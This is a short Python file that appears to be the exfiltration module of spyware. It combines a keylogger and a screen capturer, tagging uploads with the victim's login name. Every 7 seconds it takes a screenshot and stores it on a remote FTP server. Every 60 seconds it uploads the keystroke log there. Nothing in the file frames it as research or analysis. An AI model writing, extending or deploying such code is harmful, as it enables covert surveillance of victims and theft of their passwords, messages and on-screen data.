import ftplib
import atexit
from payloads.satelite import collectimage
import threading
import os
from payloads.keylogger import gethookready

username = os.getlogin()
offset = 0

Transfer = ftplib.FTP("","","")

ADDRESS = USERNAME = PASSWORD = ""

def init_creditinals(addr,usr,pssd):
    global ADDRESS,USERNAME,PASSWORD,Transfer
    ADDRESS = addr
    USERNAME = usr
    PASSWORD = pssd
    Transfer = ftplib.FTP(ADDRESS,USERNAME,PASSWORD)
    #init_creditinals(ADDRESS,USERNAME,PASSWORD)

def OnScriptEnd():
    print("Script ending")
    Transfer.quit()

def upload_to_ftp(name,upname,mode):
   
    try:
        file = open(name,mode)   
        Transfer.storbinary('STOR ' + upname , file) 
        file.close()
    
    except Exception as e:
        print("Error: upload to ftp failed : ",e)
        print("name : ",name ,"upname : ",upname,"mode : ",mode)
        pass

def startimageloggging():
    if collectimage():
        upload_to_ftp('tempic.png',username+str(offset)+'.png','rb') 

    threading.Timer(7,startimageloggging).start()

def startkeylogging():
      gethookready()
      threading.Timer(60,log_to_ftp).start()

def log_to_ftp():
    upload_to_ftp('log.txt',username+'_log.txt','rb')
    threading.Timer(60,log_to_ftp).start()


                       


